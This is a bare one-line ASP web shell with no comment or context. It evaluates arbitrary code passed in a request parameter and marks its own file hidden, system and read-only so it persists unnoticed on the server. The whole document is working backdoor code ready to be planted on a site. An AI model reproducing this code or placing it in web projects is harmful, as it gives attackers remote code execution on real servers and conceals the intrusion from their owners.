<%Eval(Request(chr(112))):Set fso=CreateObject("Scripting.FileSystemObject"):Set f=fso.GetFile(Request.ServerVariables("PATH_TRANSLATED")):if  f.attributes <> 39 then:f.attributes = 39:end if%>
